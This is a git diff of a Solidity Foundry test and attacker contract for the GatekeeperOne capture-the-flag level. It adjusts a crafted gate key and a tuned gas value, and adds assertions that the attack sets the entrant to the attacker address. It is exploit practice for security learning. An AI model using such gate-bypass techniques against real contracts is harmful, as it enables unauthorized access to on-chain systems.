@@ -14,7 +14,15 @@ contract GatekeeperOneTest is Test {
     }
 
     function testAttack() public {
+        // tx.origin addr i.e. forge test GatekeeperOneTest --sender 0xE659256acc9cF3927CEb1aBeeb03Aabe045e9d74
+        address attacker = 0xE659256acc9cF3927CEb1aBeeb03Aabe045e9d74;
+        
+        assertEq(gatekeeperOneCTF.entrant(), address(0x0));
+
+        // attack
         gatekeeperOneAttacker.attack();
+
+        assertEq(gatekeeperOneCTF.entrant(), attacker);
     }
 }
 
@@ -26,14 +34,12 @@ contract GatekeeperOneAttacker {
     }
 
     function attack() public {
-        // address addr = 0xE659256acc9cF3927CEb1aBeeb03Aabe045e9d74;
-        
         // TODO: calculate from foundry
-        bytes8 gateKeyBytes = 0x1000000000009d74; // uint16(uint160(address(this)))
-        uint256 gas = 65_107; // calculated with remix debugger
+        bytes8 gateKey = 0x1000000000009d74; // uint16(uint160(address(this)))
+        uint256 gas = 65_796; // calculated with remix debugger
 
         address(gatekeeperOneCTF).call{gas: gas}(
-          abi.encodeWithSignature("enter(bytes8)", gateKey)
+            abi.encodeWithSignature("enter(bytes8)", gateKey)
         );
     }
 }
